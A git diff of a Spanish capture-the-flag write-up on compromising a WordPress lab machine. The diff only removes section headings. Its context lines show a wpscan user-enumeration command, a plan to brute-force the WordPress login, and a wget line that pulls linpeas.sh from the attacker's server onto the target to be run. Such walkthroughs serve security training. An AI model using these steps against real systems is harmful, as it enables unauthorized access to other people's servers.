@@ -6,13 +6,11 @@
 
 ---
 
-## 1. Información Inicial
+## Información Inicial
 - **Objetivo:** Obtener las dos banderas, una disponible desde un usuario y otra desde root  
 - **Herramientas iniciales:** `nmap`, `wpscan`, `wget`, `smbclient`, `linpeas.sh`, `metasploit`, `mysql`.
 
 ---
-
-## 2. Reconocimiento y enumeración
 
 Primero realizamos un escaneo básico con `nmap` para identificar los servicios abiertos:
 ```bash 
@@ -40,8 +38,6 @@ Tratamos de descubrir toda la información posible y nos devuelve dos nombres de
 wpscan --url http://blog.thm --enumerate u,p,t,vp,vt
 ```
 ![Escaneo del sitio web con wpscan](screenshots/5.wp-scan-users.png)
-
-## 3. Explotación
 
 Conociendo estos nombre de usuario, lo que se me ocurre es realizar un ataque de fuerza bruta al loguin de WordPress aprovechando la herramienta WPScan, a la que no habría que meterle tantos parámetros como a Hydra.
 
@@ -93,8 +89,6 @@ wget http://10.8.29.132:1234/linpeas.sh
 ![Servidor python para poder descargar el fichero Linpeas](screenshots/11.python_server.png)
 
 ![Descarga del fichero Linpeas en máqunia local](screenshots/12.downloading_linpeas.png)
-
-## 4. Postexplotación
 
 Cuando se haya descargado por completo, debemos de otorgarle permisos de ejecución y ejecutarlo para comenzar a encontrar vulnerabilidades.
 ```bash 
